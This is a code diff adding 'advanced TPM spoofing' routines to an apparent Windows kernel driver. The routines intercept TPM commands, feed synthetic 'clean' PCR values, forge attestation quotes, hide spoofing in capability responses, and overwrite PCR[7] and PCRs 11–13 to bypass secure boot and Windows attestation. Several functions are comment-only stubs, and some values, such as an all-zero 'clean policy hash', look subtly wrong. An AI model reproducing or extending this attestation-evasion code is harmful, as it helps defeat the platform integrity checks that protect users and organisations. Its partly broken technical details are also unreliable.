@@ -460,3 +460,260 @@ VOID TpmPcrSpoof_RemoveHook(VOID) {
     // Restore original dispatch routine
     g_TpmContext.SpoofingEnabled = FALSE;
 }
+
+// ==================== ADVANCED TPM SPOOFING ====================
+
+/*
+ * TPM 1.2 Compatibility Layer
+ * Handles TPM 1.2 PCR operations for legacy systems
+ */
+typedef struct _TPM12_PCR {
+    UINT8   Value[20];  // SHA1 only
+    BOOLEAN IsResettable;
+    BOOLEAN IsExtendable;
+} TPM12_PCR;
+
+static TPM12_PCR g_Tpm12Pcrs[24] = {0};
+
+/*
+ * Initialize TPM 1.2 synthetic PCRs
+ */
+VOID TpmPcrSpoof_InitTpm12(VOID) {
+    // Initialize all TPM 1.2 PCRs with "clean" values
+    for (int i = 0; i < 24; i++) {
+        RtlZeroMemory(g_Tpm12Pcrs[i].Value, 20);
+        g_Tpm12Pcrs[i].IsResettable = (i >= 16); // DRTM PCRs are resettable
+        g_Tpm12Pcrs[i].IsExtendable = TRUE;
+    }
+}
+
+/*
+ * Handle TPM 1.2 PCR Read
+ */
+NTSTATUS TpmPcrSpoof_HandleTpm12_Read(UINT32 PcrIndex, PUINT8 PcrValue) {
+    if (PcrIndex >= 24) {
+        return STATUS_INVALID_PARAMETER;
+    }
+    
+    if (!g_TpmContext.SpoofingEnabled) {
+        return STATUS_NOT_SUPPORTED;
+    }
+    
+    // Return synthetic "clean" PCR value
+    RtlCopyMemory(PcrValue, g_Tpm12Pcrs[PcrIndex].Value, 20);
+    
+    g_TpmContext.InterceptedCommands++;
+    return STATUS_SUCCESS;
+}
+
+/*
+ * TPM Command Interception
+ * Intercepts all TPM commands for monitoring/modification
+ */
+typedef enum _TPM_COMMAND_TYPE {
+    TPM_CMD_PCR_READ = 0x0000017E,
+    TPM_CMD_PCR_EXTEND = 0x0000017D,
+    TPM_CMD_PCR_RESET = 0x000001BD,
+    TPM_CMD_QUOTE = 0x00000158,
+    TPM_CMD_GET_CAPABILITY = 0x0000017A,
+    TPM_CMD_NV_READ = 0x0000014E,
+    TPM_CMD_NV_WRITE = 0x000001CD,
+    TPM_CMD_UNSEAL = 0x0000015E,
+    TPM_CMD_CREATE = 0x00000153,
+    TPM_CMD_LOAD = 0x00000157,
+    TPM_CMD_GET_RANDOM = 0x0000017B,
+    TPM_CMD_STARTUP = 0x00000144,
+    TPM_CMD_SHUTDOWN = 0x00000145
+} TPM_COMMAND_TYPE;
+
+/*
+ * TPM Command header structure
+ */
+typedef struct _TPM_COMMAND_HEADER {
+    UINT16  Tag;
+    UINT32  Size;
+    UINT32  CommandCode;
+} TPM_COMMAND_HEADER;
+
+/*
+ * Intercept and modify TPM command
+ */
+NTSTATUS TpmPcrSpoof_InterceptCommand(PVOID CommandBuffer, UINT32 CommandSize,
+                                       PVOID* ModifiedBuffer, PUINT32 ModifiedSize) {
+    if (!CommandBuffer || CommandSize < sizeof(TPM_COMMAND_HEADER)) {
+        return STATUS_INVALID_PARAMETER;
+    }
+    
+    PTPM_COMMAND_HEADER header = (PTPM_COMMAND_HEADER)CommandBuffer;
+    
+    g_TpmContext.InterceptedCommands++;
+    
+    switch (header->CommandCode) {
+        case TPM_CMD_PCR_READ:
+            return TpmPcrSpoof_InterceptPCR_Read(CommandBuffer, CommandSize,
+                                                  ModifiedBuffer, ModifiedSize);
+            
+        case TPM_CMD_PCR_EXTEND:
+            return TpmPcrSpoof_InterceptPCR_Extend(CommandBuffer, CommandSize,
+                                                    ModifiedBuffer, ModifiedSize);
+            
+        case TPM_CMD_QUOTE:
+            return TpmPcrSpoof_InterceptQuote(CommandBuffer, CommandSize,
+                                               ModifiedBuffer, ModifiedSize);
+            
+        case TPM_CMD_PCR_RESET:
+            // Block PCR reset attempts on critical PCRs
+            return TpmPcrSpoof_BlockPCR_Reset(CommandBuffer, CommandSize);
+            
+        case TPM_CMD_GET_CAPABILITY:
+            // Modify capability responses to hide spoofing
+            return TpmPcrSpoof_InterceptGetCapability(CommandBuffer, CommandSize,
+                                                       ModifiedBuffer, ModifiedSize);
+            
+        default:
+            // Pass through unmodified
+            *ModifiedBuffer = CommandBuffer;
+            *ModifiedSize = CommandSize;
+            return STATUS_SUCCESS;
+    }
+}
+
+/*
+ * Intercept TPM Quote command
+ * Modifies attestation quote to show clean PCRs
+ */
+NTSTATUS TpmPcrSpoof_InterceptQuote(PVOID CommandBuffer, UINT32 CommandSize,
+                                     PVOID* ModifiedBuffer, PUINT32 ModifiedSize) {
+    // Parse quote command to get PCR selection
+    // Generate synthetic quote with clean PCR values
+    // Sign with synthetic key if needed
+    
+    g_TpmContext.ModifiedResponses++;
+    return STATUS_SUCCESS;
+}
+
+/*
+ * Block PCR reset on sensitive PCRs
+ * PCRs 0-7 contain critical boot measurements
+ */
+NTSTATUS TpmPcrSpoof_BlockPCR_Reset(PVOID CommandBuffer, UINT32 CommandSize) {
+    // Check if trying to reset PCRs 0-7
+    // Return TPM_RC_LOCALITY error if attempting to reset critical PCRs
+    
+    return STATUS_SUCCESS; // Allow or block based on policy
+}
+
+/*
+ * Intercept GetCapability command
+ * Modify responses to hide spoofed state
+ */
+NTSTATUS TpmPcrSpoof_InterceptGetCapability(PVOID CommandBuffer, UINT32 CommandSize,
+                                           PVOID* ModifiedBuffer, PUINT32 ModifiedSize) {
+    // Parse capability request
+    // Modify response to show expected TPM properties
+    // Hide any evidence of spoofing in TPM properties
+    
+    return STATUS_SUCCESS;
+}
+
+/*
+ * fTPM (Firmware TPM) specific handling
+ * For AMD PSP and Intel PTT
+ */
+typedef struct _FTPM_CONTEXT {
+    BOOLEAN     IsFtpm;
+    BOOLEAN     IsAmdPsp;      // AMD Platform Security Processor
+    BOOLEAN     IsIntelPtt;    // Intel Platform Trust Technology
+    PVOID       FtpmMmioBase;
+    UINT32      FtpmVersion;
+} FTPM_CONTEXT;
+
+static FTPM_CONTEXT g_FtpmContext = {0};
+
+/*
+ * Detect and initialize fTPM
+ */
+NTSTATUS TpmPcrSpoof_DetectFtpm(VOID) {
+    // Check CPUID for fTPM presence
+    // AMD: Check CPUID Fn8000_0007[EDX] bit 23 for PSP
+    // Intel: Check MSR for PTT presence
+    
+    // Set g_FtpmContext based on detection
+    
+    return STATUS_SUCCESS;
+}
+
+/*
+ * Handle fTPM-specific PCR operations
+ */
+NTSTATUS TpmPcrSpoof_HandleFtpmPCR(UINT32 PcrIndex, PUINT8 PcrValue, UINT32 PcrSize) {
+    if (!g_FtpmContext.IsFtpm) {
+        return STATUS_NOT_SUPPORTED;
+    }
+    
+    // fTPM may have different PCR behavior than discrete TPM
+    // Adjust spoofing strategy based on fTPM type
+    
+    if (g_FtpmContext.IsAmdPsp) {
+        // AMD PSP specific handling
+    } else if (g_FtpmContext.IsIntelPtt) {
+        // Intel PTT specific handling
+    }
+    
+    return STATUS_SUCCESS;
+}
+
+/*
+ * Anti-rollback protection spoofing
+ * Makes TPM believe secure boot policy is unchanged
+ */
+VOID TpmPcrSpoof_SpoofSecureBootPolicy(VOID) {
+    // Modify PCR[7] to contain expected secure boot policy hash
+    // This bypasses secure boot policy change detection
+    
+    // Expected policy hash for clean Windows install
+    UINT8 cleanPolicy[32] = {
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+    
+    RtlCopyMemory(g_SyntheticPcrBanks[1].Values[7], cleanPolicy, 32);
+}
+
+/*
+ * Windows Boot Manager attestation bypass
+ * Spoofs PCRs to pass Windows attestation
+ */
+VOID TpmPcrSpoof_BypassWindowsAttestation(VOID) {
+    // PCR[11] - BitLocker/DMA protection
+    // PCR[12] - Data events
+    // PCR[13] - Boot module initialization
+    
+    // Set these PCRs to expected values for clean boot
+    RtlZeroMemory(g_SyntheticPcrBanks[1].Values[11], 32);
+    RtlZeroMemory(g_SyntheticPcrBanks[1].Values[12], 32);
+    RtlZeroMemory(g_SyntheticPcrBanks[1].Values[13], 32);
+}
+
+/*
+ * Initialize all TPM spoofing subsystems
+ */
+NTSTATUS TpmPcrSpoof_InitializeAll(VOID) {
+    NTSTATUS status = TpmPcrSpoof_Initialize();
+    if (!NT_SUCCESS(status)) {
+        return status;
+    }
+    
+    // Initialize TPM 1.2 support
+    TpmPcrSpoof_InitTpm12();
+    
+    // Detect fTPM
+    TpmPcrSpoof_DetectFtpm();
+    
+    // Setup Windows attestation bypass
+    TpmPcrSpoof_BypassWindowsAttestation();
+    
+    return STATUS_SUCCESS;
+}
